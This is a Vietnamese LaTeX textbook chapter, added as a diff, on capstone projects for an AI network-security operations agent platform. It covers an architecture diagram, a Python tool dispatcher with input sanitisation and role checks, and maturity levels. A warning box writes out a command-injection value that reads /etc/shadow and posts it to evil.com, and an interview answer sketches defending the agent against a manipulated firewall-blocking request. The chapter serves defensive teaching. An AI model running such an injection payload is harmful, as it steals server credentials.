@@ -1,0 +1,236 @@
+% ==============================================================================
+% PHASE8_CAPSTONE.TEX — GIAI ĐOẠN 8: DỰ ÁN THỰC CHIẾN & ĐỒ ÁN ĐỈNH CAO (CAPSTONE)
+% ==============================================================================
+
+\chapter{Dự Án Thực Chiến \& Đồ Án Đỉnh Cao (Capstone Platform)}
+\label{ch:phase8-capstone}
+
+Mục tiêu tối thượng của toàn bộ giáo trình không phải là tích lũy lý thuyết rời rạc, mà là khả năng hiện thực hóa các sản phẩm kỹ thuật hoàn chỉnh ở cấp độ doanh nghiệp. Chương này dẫn dắt người học từ các bài toán rèn luyện kỹ năng đơn lẻ, các dự án kỹ nghệ chuyên sâu đến đồ án kỳ hạm: \textbf{Nền Tảng AI Network \& Security Operations (AI-NetSecOps)}.
+
+\section{Danh Mục Mini Projects \& Engineering Projects Doanh Nghiệp}
+\label{sec:capstone-projects-catalog}
+
+Để xây dựng sự tự tin và phản xạ kỹ thuật vững chắc, người học cần vượt qua lộ trình tích lũy theo hai cấp độ:
+
+\begin{figure}[htbp]
+\centering
+\begin{tcolorbox}[colback=boxbg,colframe=primarycolor,width=0.95\textwidth,arc=2pt]
+\small
+\textbf{Lộ Trình Tích Lũy Dự Án Thực Chiến}:\\[0.2cm]
+\textbf{1. Hệ Thống Mini Projects Rèn Luyện Kỹ Năng Đơn Lẻ (10-15 Bài)}:
+\begin{itemize}
+  \item \textbf{CLI Vector Search}: Tìm kiếm ngữ nghĩa tài liệu văn bản bằng Python thuần và SQLite.
+  \item \textbf{High-Throughput Log Streamer}: Xử lý luồng log máy chủ 10.000 dòng/giây bằng Python Asyncio.
+  \item \textbf{Scratch Autograd Engine}: Tự xây dựng cơ chế đạo hàm tự động tương tự PyTorch Micrograd.
+  \item \textbf{Byte-Pair Encoding (BPE) Tokenizer}: Thuật toán nén và mã hóa từ vựng tiếng Việt.
+  \item \textbf{FastAPI Caching Proxy}: Cổng đệm truy vấn LLM tích hợp Redis và SHA-256.
+  \item \textbf{Network Diagnostics Tool Bot}: Trợ lý tự động kiểm tra định tuyến IP, DNS và độ trễ ICMP.
+  \item \textbf{Prompt Injection Filter}: Bộ lọc phát hiện tấn công tiêm mã lệnh bằng Bi-Encoder.
+\end{itemize}
+\textbf{2. Dự Án Kỹ Nghệ Doanh Nghiệp (Enterprise Engineering Projects)}:
+\begin{itemize}
+  \item \textbf{Enterprise Document Ingestion Pipeline}: Bóc tách hóa đơn, OCR đa ngôn ngữ, đẩy tác vụ qua hàng đợi RabbitMQ và lưu trữ dữ liệu có cấu trúc vào PostgreSQL.
+  \item \textbf{Automated Incident Triage System}: Tiếp nhận webhook từ Sentry/Jira, phân tích stacktrace lỗi, đối chiếu mã nguồn GitHub và tự động đề xuất Pull Request sửa lỗi.
+  \item \textbf{High-Performance LLM Gateway}: Cụm Gateway cân bằng tải nhiều máy chủ vLLM, tích hợp Rate Limiter phân tầng và bộ nhớ đệm ngữ nghĩa hai tầng.
+\end{itemize}
+\end{tcolorbox}
+\caption{Bản đồ phân tầng các dự án thực chiến từ nền tảng đến quy mô lớn}
+\label{fig:capstone-projects-map}
+\end{figure}
+
+\section{Flagship Capstone: Nền Tảng AI-NetSecOps Hoàn Chỉnh}
+\label{sec:capstone-flagship}
+
+Đồ án đỉnh cao của chương trình là \textbf{AI-NetSecOps Platform} --- hệ thống trợ lý điều hành trung tâm giám sát mạng và phản ứng sự cố an ninh mạng tự hành dành cho hạ tầng doanh nghiệp.
+
+\begin{figure}[htbp]
+\centering
+\begin{tcolorbox}[colback=boxbg,colframe=primarycolor,width=0.95\textwidth,arc=2pt]
+\small
+\textbf{Sơ Đồ Kiến Trúc Toàn Diện Nền Tảng AI-NetSecOps}:\\[0.2cm]
+\texttt{SOC Operator / Network Admin} $\longrightarrow$ \textbf{React / Vite Web Dashboard}\\
+$\downarrow$ (HTTPS / WSS / JWT Session Cookie)\\
+\textbf{API Gateway (FastAPI)}:
+\begin{itemize}
+  \item Xác thực người dùng, kiểm soát phân quyền dựa trên vai trò (RBAC).
+  \item Lớp bảo vệ tiền xử lý (\textit{Input Guardrail}): Chặn Prompt Injection và rà soát PII.
+  \item Tích hợp Circuit Breaker và Redis Rate Limiter.
+\end{itemize}
+$\downarrow$\\
+\textbf{Bộ Điều Phối Agent Tự Hành (LangGraph Orchestrator)}:
+\begin{itemize}
+  \item Quản lý trạng thái đa phiên (\textit{Checkpointing with PostgreSQL}).
+  \item Vòng lặp suy luận ReAct và cơ chế Human-in-the-Loop trước các hành động can thiệp hạ tầng.
+\end{itemize}
+$\downarrow$ (Lệnh gọi công cụ có kiểm soát)\\
+\textbf{Hệ Thống Công Cụ Phân Tán (Secured Tool Suite)}:
+\begin{itemize}
+  \item \textit{Network Tools}: Ping, Traceroute, DNS Dig, Nmap Port Probe (Sandbox cô lập).
+  \item \textit{Log Intelligence}: Trích xuất và phân tích định dạng Syslog, Suricata IDS, Nginx logs.
+  \item \textit{Security Intelligence RAG}: Tra cứu CVE từ cơ sở dữ liệu Qdrant và MITRE ATT\&CK.
+  \item \textit{Remediation Tools}: Đề xuất cấu hình tường lửa IPTables và danh sách đen IP.
+\end{itemize}
+$\downarrow$\\
+\textbf{Hạ Tầng Suy Luận (Model Serving Layer)}:
+\begin{itemize}
+  \item Local vLLM Cluster (Llama-3-70B-Instruct AWQ) với PagedAttention.
+  \item Cloud Fallback Engine (Claude-3.5-Sonnet) kích hoạt khi GPU quá tải.
+\end{itemize}
+\end{tcolorbox}
+\caption{Kiến trúc kỹ thuật hoàn chỉnh của Nền tảng AI-NetSecOps}
+\label{fig:capstone-netsecops-arch}
+\end{figure}
+
+\begin{definitionbox}[Mô Hình Vận Hành An Toàn Trong AI-NetSecOps]
+Trong quản trị an ninh mạng, một câu lệnh sai lầm có thể làm ngắt kết nối của toàn bộ trung tâm dữ liệu. Do đó, hệ thống AI-NetSecOps áp dụng nguyên tắc \term{Tối Thiểu Quyền Hạn (Principle of Least Privilege)} và cơ chế \term{Can Thiệp Bắt Buộc Của Con Người (Human-in-the-Loop Approval)}:
+\begin{itemize}
+  \item Các thao tác đọc thông tin và chuẩn đoán (\textit{Read-Only Diagnostics}) như kiểm tra Ping, phân tích Log, tra cứu CVE được thực thi tự động.
+  \item Mọi thao tác ghi hoặc thay đổi cấu hình hạ tầng (\textit{Write/Mutation Actions}) như áp đặt rule tường lửa hoặc cô lập IP đều bắt buộc phải tạm dừng trạng thái Agent và yêu cầu quản trị viên ký duyệt số (\textit{Digital Approval}) trước khi gửi lệnh xuống hệ thống.
+\end{itemize}
+\end{definitionbox}
+
+\section{Hiện Thực Hóa: Bộ Điều Phối Agent Dispatcher \& Tool Suite}
+\label{sec:capstone-implementation}
+
+Dưới đây là mã nguồn Python chuẩn mực triển khai khung điều phối công cụ tự hành có kiểm soát schema và sandbox của nền tảng AI-NetSecOps:
+
+\begin{workedexamplebox}[Triển Khai Capstone Tool Dispatcher An Toàn Bằng Python]
+\begin{lstlisting}[language=Python]
+from typing import Dict, Any, List
+import re
+
+class NetSecToolSuite:
+    """Bo cong cu quan tri mang va an ninh danh cho AI Agent."""
+    
+    @staticmethod
+    def ping_diagnostic(host: str) -> Dict[str, Any]:
+        """Kiem tra do tre mang va ket noi toi host."""
+        # Sanitize input de phong chong Command Injection
+        if not re.match(r"^[a-zA-Z0-9.-]+$", host):
+            return {"status": "error", "message": "Invalid hostname or IP"}
+        # Gia lap ket qua chuan doan mang
+        return {
+            "status": "success",
+            "host": host,
+            "packets_transmitted": 4,
+            "packets_received": 4,
+            "packet_loss_percent": 0.0,
+            "avg_latency_ms": 14.2
+        }
+
+    @staticmethod
+    def analyze_syslog(log_line: str) -> Dict[str, Any]:
+        """Phan tich cu phap va danh gia muc do nguy hiem cua log."""
+        is_attack = "failed password" in log_line.lower() or "unauthorized" in log_line.lower()
+        return {
+            "log": log_line,
+            "threat_detected": is_attack,
+            "severity": "CRITICAL" if is_attack else "INFO",
+            "recommended_action": "BLOCK_IP" if is_attack else "IGNORE"
+        }
+
+class NetSecAgentDispatcher:
+    """Dieu phoi va kiem soat quyen han thuc thi cong cu cua Agent."""
+    
+    def __init__(self):
+        self.tools = NetSecToolSuite()
+        self.execution_audit_log: List[Dict[str, Any]] = []
+
+    def dispatch(self, tool_name: str, arguments: Dict[str, Any], user_role: str) -> Dict[str, Any]:
+        # Ghi log kiem toan moi yeu cau goi tool
+        audit_entry = {"tool": tool_name, "args": arguments, "role": user_role}
+        self.execution_audit_log.append(audit_entry)
+
+        if tool_name == "ping":
+            host = arguments.get("host", "")
+            return self.tools.ping_diagnostic(host)
+            
+        elif tool_name == "analyze_log":
+            line = arguments.get("log_line", "")
+            return self.tools.analyze_syslog(line)
+            
+        elif tool_name == "apply_firewall_rule":
+            # Thao tac nhay cam bat buoc phai co quyen ADMIN
+            if user_role != "NETSEC_ADMIN":
+                return {
+                    "status": "denied",
+                    "error": "Requires NETSEC_ADMIN role and explicit human confirmation"
+                }
+            return {"status": "success", "rule_applied": arguments.get("rule")}
+            
+        return {"status": "error", "message": f"Unknown tool: {tool_name}"}
+\end{lstlisting}
+\end{workedexamplebox}
+
+\section{Khung Đánh Giá 6 Cấp Độ Trưởng Thành (Maturity Levels)}
+\label{sec:capstone-maturity-levels}
+
+Một dự án kỹ sư thực thụ được đánh giá bằng độ hoàn thiện sản phẩm theo 6 cấp độ nghiêm ngặt:
+
+\begin{figure}[htbp]
+\centering
+\begin{tcolorbox}[colback=boxbg,colframe=primarycolor,width=0.95\textwidth,arc=2pt]
+\small
+\textbf{Khung Đánh Giá 6 Cấp Độ Trưởng Thành Của Dự Án AI Kỹ Nghệ}:\\[0.2cm]
+\textbf{Level 1: Make it work (Chạy được luồng cơ sở)}
+\begin{itemize}
+  \item Ứng dụng chạy được end-to-end từ giao diện người dùng đến mô hình AI và trả về kết quả chính xác cho 1 request đơn lẻ.
+\end{itemize}
+\textbf{Level 2: Understand it (Lý giải tường minh kiến trúc)}
+\begin{itemize}
+  \item Tác giả giải thích được lý do lựa chọn từng công nghệ (tại sao dùng Qdrant thay vì Pinecone, tại sao dùng LangGraph thay vì AutoGen, tại sao AWQ thay vì GGUF).
+\end{itemize}
+\textbf{Level 3: Test it (Độ bao phủ kiểm thử toàn diện)}
+\begin{itemize}
+  \item Kiểm thử đơn vị (Unit Tests), kiểm thử tích hợp (Integration Tests) với độ bao phủ $> 80\%$. Có mock external API đầy đủ trong CI/CD.
+\end{itemize}
+\textbf{Level 4: Secure it (Bảo mật chuyên sâu)}
+\begin{itemize}
+  \item Vượt qua bài kiểm tra thẩm định OWASP LLM Top 10: chống Prompt Injection, mã hóa JWT an toàn, cô lập môi trường thực thi tool bằng Sandbox.
+\end{itemize}
+\textbf{Level 5: Optimize it (Tối ưu hóa hiệu năng \& độ trễ)}
+\begin{itemize}
+  \item Áp dụng Semantic Caching giảm $40\%$ tải GPU, streaming câu trả lời mượt mà với $TTFT < 400\text{ms}$.
+\end{itemize}
+\textbf{Level 6: Deploy it (Sẵn sàng môi trường vận hành Production)}
+\begin{itemize}
+  \item Đóng gói Docker Compose đa container có healthcheck, cấu hình tự động triển khai bằng GitHub Actions, giám sát thời gian thực với Prometheus \& Grafana.
+\end{itemize}
+\end{tcolorbox}
+\caption{Khung 6 cấp độ trưởng thành đánh giá chất lượng đồ án tốt nghiệp}
+\label{fig:capstone-maturity-matrix}
+\end{figure}
+
+\begin{securitybox}[Cảnh Giác Lỗ Hổng Command Injection Trong Công Cụ Mạng]
+\textbf{Mối hiểm họa}: Nếu công cụ kiểm tra Ping thực thi bằng hàm hệ điều hành \code{os.system(f"ping -c 4 \{host\}")}, kẻ tấn công có thể truyền tham số:
+\code{host = "8.8.8.8; cat /etc/shadow | curl -X POST -d @- evil.com"}
+Lệnh này sẽ trích xuất tệp mật khẩu máy chủ gửi ra ngoài Internet!\\
+\textbf{Giải pháp bắt buộc}:
+\begin{enumerate}
+  \item Không bao giờ dùng chuỗi thô trong lệnh shell (\code{shell=True}).
+  \item Kiểm tra định dạng bằng biểu thức chính quy nghiêm ngặt (\code{Regex Validation}) chỉ cho phép ký tự chữ và số.
+  \item Luôn thực thi các câu lệnh chuẩn đoán mạng bên trong một Docker Container cách ly không có đặc quyền root (\textit{Rootless Sandbox}).
+\end{enumerate}
+\end{securitybox}
+
+\begin{interviewbox}[Phản Biện Kỹ Thuật Đồ Án Trước Ban Giám Khảo Doanh Nghiệp]
+\textbf{Câu hỏi của CTO/Tech Lead}: \textit{``Trong đồ án AI-NetSecOps của bạn, nếu một quản trị viên hỏi câu hỏi chứa nội dung lừa đảo ép Agent tự động chặn dải IP mạng nội bộ của công ty, hệ thống của bạn phòng thủ như thế nào?''}\\
+\textbf{Câu trả lời mẫu của Kỹ sư Cấp cao}:
+\begin{enumerate}
+  \item \textbf{Phòng ngự tầng Input}: Cổng tiếp nhận sử dụng bộ lọc Guardrail đối chiếu mẫu Prompt Injection trước khi đưa câu hỏi vào LangGraph.
+  \item \textbf{Phân quyền vai trò (RBAC)}: Công cụ \code{apply_firewall_rule} kiểm tra Token JWT của người dùng. Nếu không mang vai trò \code{NETSEC_ADMIN}, yêu cầu bị từ chối ngay lập tức.
+  \item \textbf{Cơ chế Human-in-the-Loop}: Kể cả khi người dùng là Admin, việc chặn dải IP là thao tác nguy hại cao (\textit{Destructive Action}), LangGraph sẽ dừng chu trình và gửi thông báo cảnh báo đến kênh bảo mật Slack/Email yêu cầu xác thực hai lớp (2FA) trước khi phê duyệt.
+  \item \textbf{Hạn chế tầm tác động}: Mã nguồn của Tool có danh sách trắng (\textit{Allowlist}) bảo vệ các dải IP nội bộ trọng yếu (\code{127.0.0.1}, \code{10.0.0.0/8}), từ chối mọi thao tác chặn các dải IP này.
+\end{enumerate}
+\end{interviewbox}
+
+\begin{checkpointbox}[Nghiệm Thu Đồ Án Tốt Nghiệp AI-NetSecOps]
+Đánh dấu hoàn thành khi đồ án của bạn đáp ứng các tiêu chí:
+\begin{itemize}
+  \item[$\square$] Hệ thống kết nối thông suốt giữa Web UI, FastAPI Gateway và LangGraph Agent.
+  \item[$\square$] Hoàn thiện bộ công cụ Diagnostics, Log Analysis và RAG Security Intelligence.
+  \item[$\square$] Đạt độ bao phủ kiểm thử Pytest trên $80\%$ mã nguồn.
+  \item[$\square$] Đảm bảo an toàn không để xảy ra Command Injection hay Privilege Escalation.
+  \item[$\square$] Đóng gói toàn bộ cụm dịch vụ hoàn chỉnh bằng Docker Compose sẵn sàng chạy trên máy chủ.
+\end{itemize}
+\end{checkpointbox}
